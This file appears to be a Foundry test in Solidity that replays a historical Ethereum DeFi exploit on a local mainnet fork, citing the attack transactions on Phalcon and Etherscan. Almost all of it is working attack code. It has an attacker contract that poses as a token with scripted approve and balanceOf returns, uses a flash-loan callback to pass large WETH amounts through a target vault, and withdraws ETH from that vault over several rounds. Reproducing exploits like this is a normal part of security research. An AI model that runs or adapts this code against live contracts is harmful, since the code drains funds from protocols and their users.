// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xb7faca63a73d5d0490dda1c390577db3f30414cd91ce462e45c1e7f37c258519
// https://etherscan.io/address/0xCB36b1ee0Af68Dce5578a487fF2Da81282512233

struct S1 {
    address p1;
    uint256 p2;
}

struct S3 {
    bool p1;
    uint8 p2;
    uint8 p3;
    uint256 p4;
}

struct S2 {
    uint8 p1;
    uint256 p2;
    S3 p3;
    uint256 p4;
    uint256 p5;
    address p6;
    uint256 p7;
    bytes p8;
}

interface I {
    function work(uint256, address, uint256, uint256, bytes memory) external payable;
    function deposit() external payable;
    function balanceOf(address) external payable returns (uint256);
    function withdraw(uint256) external payable;
    function operate(S1[] memory, S2[] memory) external payable;
}

contract X2f75 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xb7faca63a73d5d0490dda1c390577db3f30414cd91ce462e45c1e7f37c258519");
    }

    address constant x1e04 = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x67b6 = 0x67B66C99D3Eb37Fa76Aa3Ed1ff33E8e39F0b9c7A;
    address constant x8179 = 0x81796c4602B82054a727527CD16119807b8C7608;
    address constant x9eed = 0x9EED7274Ea4b614ACC217e46727d377f7e6F9b24;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd6e1 = 0xD6e194aF3d9674b62D1b30Ec676030C23961275e;

    uint256 t_callFunction = 0;
    uint256 t_approve = 0;
    uint256 t_donate = 0;
    uint256 t_balanceOf = 0;

    function test1() public {
        // vm.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);

        vm.createSelectFork("http://localhost:18545", 12394249); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x870f03878f3af6ec04d6b3b26888f37b7fcdd81e73a8358eaee3f75a1657698d));

        // https://explorer.phalcon.xyz/tx/eth/0x870f03878f3af6ec04d6b3b26888f37b7fcdd81e73a8358eaee3f75a1657698d
        this.x870f0387();
        // https://explorer.phalcon.xyz/tx/eth/0xfdc65cfff14fa187dae9c329fa5ab98e50f8d5c7f6912fbe0d61d95e3d528561
        this.xfdc65cff();
        // https://explorer.phalcon.xyz/tx/eth/0x486c71eb4f461b7556e6e35e432adb7f87ad2934ef90b8f4f6857c2c2e5e3663
        this.x486c71eb();
        // https://explorer.phalcon.xyz/tx/eth/0xe9bab635eb91fe28533e3ab21b06f6c0b92908043940bd84a704943837dff928
        this.xe9bab635();
        // https://explorer.phalcon.xyz/tx/eth/0x6ede7fe2569ea12d9bbb8bc7cbe1b69ca3207cf2ecf49bb3b5714ca4d4945fc8
        this.x6ede7fe2();
        // https://explorer.phalcon.xyz/tx/eth/0x08ea96a8c312677bb47d5674dada18083a6688159323edcf60fc087c70688b43
        this.x08ea96a8();
        // https://explorer.phalcon.xyz/tx/eth/0xfe728b23d8415e9c549c32d427b113bba1c8e4f676d96bf9bb58bd3ad08dedac
        this.xfe728b23();
        // https://explorer.phalcon.xyz/tx/eth/0xf580bd47217ffbf9ac3b2b802b229a6f7d4cb36b2580921c5ab3fab9573f8f91
        this.xf580bd47();
        // https://explorer.phalcon.xyz/tx/eth/0x1655592eda3ebbba7c530ab3327daeae95fa95d05c3dec40338471245da10cfe
        this.x1655592e();
        // https://explorer.phalcon.xyz/tx/eth/0xb7faca63a73d5d0490dda1c390577db3f30414cd91ce462e45c1e7f37c258519
        this.donate{value: 3454000000000000000000}();
    }

    function test2() public {
        // vm.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);

        vm.createSelectFork("http://localhost:18545", 12394241); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x870f03878f3af6ec04d6b3b26888f37b7fcdd81e73a8358eaee3f75a1657698d
        this.x870f0387();
        vm.warp(1620484550);
        vm.roll(12394241);
        // https://explorer.phalcon.xyz/tx/eth/0xfdc65cfff14fa187dae9c329fa5ab98e50f8d5c7f6912fbe0d61d95e3d528561
        this.xfdc65cff();
        vm.warp(1620484550);
        vm.roll(12394241);
        // https://explorer.phalcon.xyz/tx/eth/0x486c71eb4f461b7556e6e35e432adb7f87ad2934ef90b8f4f6857c2c2e5e3663
        this.x486c71eb();
        vm.warp(1620484550);
        vm.roll(12394241);
        // https://explorer.phalcon.xyz/tx/eth/0xe9bab635eb91fe28533e3ab21b06f6c0b92908043940bd84a704943837dff928
        this.xe9bab635();
        vm.warp(1620484597);
        vm.roll(12394242);
        // https://explorer.phalcon.xyz/tx/eth/0x6ede7fe2569ea12d9bbb8bc7cbe1b69ca3207cf2ecf49bb3b5714ca4d4945fc8
        this.x6ede7fe2();
        vm.warp(1620484600);
        vm.roll(12394243);
        // https://explorer.phalcon.xyz/tx/eth/0x08ea96a8c312677bb47d5674dada18083a6688159323edcf60fc087c70688b43
        this.x08ea96a8();
        vm.warp(1620484606);
        vm.roll(12394244);
        // https://explorer.phalcon.xyz/tx/eth/0xfe728b23d8415e9c549c32d427b113bba1c8e4f676d96bf9bb58bd3ad08dedac
        this.xfe728b23();
        vm.warp(1620484666);
        vm.roll(12394245);
        // https://explorer.phalcon.xyz/tx/eth/0xf580bd47217ffbf9ac3b2b802b229a6f7d4cb36b2580921c5ab3fab9573f8f91
        this.xf580bd47();
        vm.warp(1620484686);
        vm.roll(12394246);
        // https://explorer.phalcon.xyz/tx/eth/0x1655592eda3ebbba7c530ab3327daeae95fa95d05c3dec40338471245da10cfe
        this.x1655592e();
        vm.warp(1620484707);
        vm.roll(12394249);
        // https://explorer.phalcon.xyz/tx/eth/0xb7faca63a73d5d0490dda1c390577db3f30414cd91ce462e45c1e7f37c258519
        this.donate{value: 3454000000000000000000}();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 12394249); // tx.blockNumber - 1

        vm.warp(1620484707);
        vm.roll(12394250);
        // https://explorer.phalcon.xyz/tx/eth/0xb7faca63a73d5d0490dda1c390577db3f30414cd91ce462e45c1e7f37c258519
        this.donate{value: 3454000000000000000000}();
    }

    function x486c71eb() public {
        bytes memory b06 = abi.encode(x8179, 64, 96, r, 0, 0);
        I(x67b6).work{value: 1000000000}(0, x9eed, 0, 100000000000000000000000, b06);
    }

    function xe9bab635() public {
        X2f75(payable(r)).donate{value: 3364000000000000000000}();
    }

    function xfdc65cff() public {
        X2f75(payable(r)).donate{value: 3364000000000000000000}();
    }

    function donate() public payable {
        t_donate++;

        if (t_donate == 1) {
            I(xd6e1).balanceOf(r);
            I(xd6e1).withdraw(32177988979252982963);
            return;
        }
        if (t_donate == 2) {
            I(xd6e1).balanceOf(r);
            I(xd6e1).withdraw(31664542631732219406);
            return;
        }
        if (t_donate == 3) {
            I(xd6e1).balanceOf(r);
            I(xd6e1).withdraw(31158706911402375422);
            return;
        }
        if (t_donate == 4) {
            I(xd6e1).balanceOf(r);
            I(xd6e1).withdraw(31902213393565797416);
            return;
        }
        if (t_donate == 5) {
            I(xd6e1).balanceOf(r);
            I(xd6e1).withdraw(33845463268344338495);
            return;
        }
    }

    function xfe728b23() public {
        bytes memory b16 = abi.encode(x8179, 64, 96, r, 0, 0);
        I(x67b6).work{value: 1000000000}(0, x9eed, 0, 100000000000000000000000, b16);
    }

    function x870f0387() public {
        bytes memory b01 = abi.encode(x8179, 64, 96, r, 0, 0);
        I(x67b6).work{value: 1000000000}(0, x9eed, 0, 100000000000000000000000, b01);
    }

    function xf580bd47() public {
        X2f75(payable(r)).donate{value: 3787000000000000000000}();
    }

    function x6ede7fe2() public {
        bytes memory b11 = abi.encode(x8179, 64, 96, r, 0, 0);
        I(x67b6).work{value: 1000000000}(0, x9eed, 0, 100000000000000000000000, b11);
    }

    function x08ea96a8() public {
        X2f75(payable(r)).donate{value: 3504000000000000000000}();
    }

    function x1655592e() public {
        bytes memory b21 = abi.encode(x8179, 64, 96, r, 0, 0);
        I(x67b6).work{value: 1000000000}(0, x9eed, 0, 100000000000000000000000, b21);
    }

    function callFunction(address, S1 memory, bytes memory) public {
        t_callFunction++;

        if (t_callFunction == 1) {
            I(xc02a).withdraw(58903475527669301229507);
            I(xd6e1).deposit{value: 58903475527669301229507}();
            x67b6.call{value: 3396699186603790851014}("");
            I(xd6e1).withdraw(58903475527669301229507);
            I(xc02a).deposit{value: 58903475527669301229509}();
            return;
        }
        if (t_callFunction == 2) {
            I(xc02a).withdraw(58903475527669301229509);
            I(xd6e1).deposit{value: 58903475527669301229509}();
            x67b6.call{value: 3396177988979252982961}("");
            I(xd6e1).withdraw(58903475527669301229510);
            I(xc02a).deposit{value: 58903475527669301229511}();
            return;
        }
        if (t_callFunction == 3) {
            I(xc02a).withdraw(58903475527669301229511);
            I(xd6e1).deposit{value: 58903475527669301229511}();
            x67b6.call{value: 3395664542631732219405}("");
            I(xd6e1).withdraw(58903475527669301229511);
            I(xc02a).deposit{value: 58903475527669301229513}();
            return;
        }
        if (t_callFunction == 4) {
            I(xc02a).withdraw(58903475527669301229513);
            I(xd6e1).deposit{value: 58903475527669301229513}();
            x67b6.call{value: 3535158706911402375420}("");
            I(xd6e1).withdraw(58903475527774456626963);
            I(xc02a).deposit{value: 58903475527669301229515}();
            return;
        }
        if (t_callFunction == 5) {
            I(xc02a).withdraw(58903475527669301229515);
            I(xd6e1).deposit{value: 58903475527669301229515}();
            x67b6.call{value: 3818902213498721194864}("");
            I(xd6e1).withdraw(58903475529823425437431);
            I(xc02a).deposit{value: 58903475527669301229517}();
            return;
        }
    }

    function approve(address, uint256) public {
        t_approve++;

        if (t_approve == 1) {
            // uint256 v1 = 58903475527669301229507;
            uint256 v1 = I(xc02a).balanceOf(x1e04);
            console2.log("I(xc02a).balanceOf(x1e04)\t->", "58903475527669301229507 (58903.4755 ether)");

            S1 memory s101 = S1(r, 1);
            S1[] memory arr01 = new S1[](1);
            arr01[0] = s101;
            S3 memory s301 = S3(false, 0, 0, 58903475527669301229507);
            S2 memory s201 = S2(1, 0, s301, 0, 0, r, 0, "");
            S3 memory s302 = S3(false, 0, 0, 0);
            bytes memory b04 = abi.encode(58903475527669301229507);
            S2 memory s202 = S2(8, 0, s302, 0, 0, r, 0, b04);
            S3 memory s303 = S3(true, 0, 0, 58903475527669301229509);
            S2 memory s203 = S2(0, 0, s303, 0, 0, r, 0, "");
            S2[] memory arr02 = new S2[](3);
            arr02[0] = s201;
            arr02[1] = s202;
            arr02[2] = s203;
            I(x1e04).operate(arr01, arr02);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 2) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 3) {
            // uint256 v1 = 58903475527669301229509;
            uint256 v1 = I(xc02a).balanceOf(x1e04);
            console2.log("I(xc02a).balanceOf(x1e04)\t->", "58903475527669301229509 (58903.4755 ether)");

            S1 memory s103 = S1(r, 1);
            S1[] memory arr04 = new S1[](1);
            arr04[0] = s103;
            S3 memory s304 = S3(false, 0, 0, 58903475527669301229509);
            S2 memory s204 = S2(1, 0, s304, 0, 0, r, 0, "");
            S3 memory s305 = S3(false, 0, 0, 0);
            bytes memory b09 = abi.encode(58903475527669301229509);
            S2 memory s205 = S2(8, 0, s305, 0, 0, r, 0, b09);
            S3 memory s306 = S3(true, 0, 0, 58903475527669301229511);
            S2 memory s206 = S2(0, 0, s306, 0, 0, r, 0, "");
            S2[] memory arr05 = new S2[](3);
            arr05[0] = s204;
            arr05[1] = s205;
            arr05[2] = s206;
            I(x1e04).operate(arr04, arr05);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 4) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 5) {
            // uint256 v1 = 58903475527669301229511;
            uint256 v1 = I(xc02a).balanceOf(x1e04);
            console2.log("I(xc02a).balanceOf(x1e04)\t->", "58903475527669301229511 (58903.4755 ether)");

            S1 memory s105 = S1(r, 1);
            S1[] memory arr07 = new S1[](1);
            arr07[0] = s105;
            S3 memory s307 = S3(false, 0, 0, 58903475527669301229511);
            S2 memory s207 = S2(1, 0, s307, 0, 0, r, 0, "");
            S3 memory s308 = S3(false, 0, 0, 0);
            bytes memory b14 = abi.encode(58903475527669301229511);
            S2 memory s208 = S2(8, 0, s308, 0, 0, r, 0, b14);
            S3 memory s309 = S3(true, 0, 0, 58903475527669301229513);
            S2 memory s209 = S2(0, 0, s309, 0, 0, r, 0, "");
            S2[] memory arr08 = new S2[](3);
            arr08[0] = s207;
            arr08[1] = s208;
            arr08[2] = s209;
            I(x1e04).operate(arr07, arr08);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 6) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 7) {
            // uint256 v1 = 58903475527669301229513;
            uint256 v1 = I(xc02a).balanceOf(x1e04);
            console2.log("I(xc02a).balanceOf(x1e04)\t->", "58903475527669301229513 (58903.4755 ether)");

            S1 memory s107 = S1(r, 1);
            S1[] memory arr10 = new S1[](1);
            arr10[0] = s107;
            S3 memory s310 = S3(false, 0, 0, 58903475527669301229513);
            S2 memory s210 = S2(1, 0, s310, 0, 0, r, 0, "");
            S3 memory s311 = S3(false, 0, 0, 0);
            bytes memory b19 = abi.encode(58903475527669301229513);
            S2 memory s211 = S2(8, 0, s311, 0, 0, r, 0, b19);
            S3 memory s312 = S3(true, 0, 0, 58903475527669301229515);
            S2 memory s212 = S2(0, 0, s312, 0, 0, r, 0, "");
            S2[] memory arr11 = new S2[](3);
            arr11[0] = s210;
            arr11[1] = s211;
            arr11[2] = s212;
            I(x1e04).operate(arr10, arr11);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 8) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 9) {
            // uint256 v1 = 58903475527669301229515;
            uint256 v1 = I(xc02a).balanceOf(x1e04);
            console2.log("I(xc02a).balanceOf(x1e04)\t->", "58903475527669301229515 (58903.4755 ether)");

            S1 memory s109 = S1(r, 1);
            S1[] memory arr13 = new S1[](1);
            arr13[0] = s109;
            S3 memory s313 = S3(false, 0, 0, 58903475527669301229515);
            S2 memory s213 = S2(1, 0, s313, 0, 0, r, 0, "");
            S3 memory s314 = S3(false, 0, 0, 0);
            bytes memory b24 = abi.encode(58903475527669301229515);
            S2 memory s214 = S2(8, 0, s314, 0, 0, r, 0, b24);
            S3 memory s315 = S3(true, 0, 0, 58903475527669301229517);
            S2 memory s215 = S2(0, 0, s315, 0, 0, r, 0, "");
            S2[] memory arr14 = new S2[](3);
            arr14[0] = s213;
            arr14[1] = s214;
            arr14[2] = s215;
            I(x1e04).operate(arr13, arr14);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_approve == 10) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function transfer(address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function call() public payable {}

    function balanceOf(address) public returns (uint256) {
        t_balanceOf++;

        if (t_balanceOf == 1) {
            return 0;
        }
        if (t_balanceOf == 2) {
            return 994374568;
        }
        if (t_balanceOf == 3) {
            return 5625432;
        }
        if (t_balanceOf == 4) {
            return 1000000000;
        }
        if (t_balanceOf == 5) {
            return 0;
        }
        if (t_balanceOf == 6) {
            return 994437249;
        }
        if (t_balanceOf == 7) {
            return 5562751;
        }
        if (t_balanceOf == 8) {
            return 1000000000;
        }
        if (t_balanceOf == 9) {
            return 0;
        }
        if (t_balanceOf == 10) {
            return 994498548;
        }
        if (t_balanceOf == 11) {
            return 5501452;
        }
        if (t_balanceOf == 12) {
            return 1000000000;
        }
        if (t_balanceOf == 13) {
            return 0;
        }
        if (t_balanceOf == 14) {
            return 994558510;
        }
        if (t_balanceOf == 15) {
            return 5441490;
        }
        if (t_balanceOf == 16) {
            return 1000000000;
        }
        if (t_balanceOf == 17) {
            return 0;
        }
        if (t_balanceOf == 18) {
            return 994617180;
        }
        if (t_balanceOf == 19) {
            return 5382820;
        }
        if (t_balanceOf == 20) {
            return 1000000000;
        }
    }

    function transferFrom(address, address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
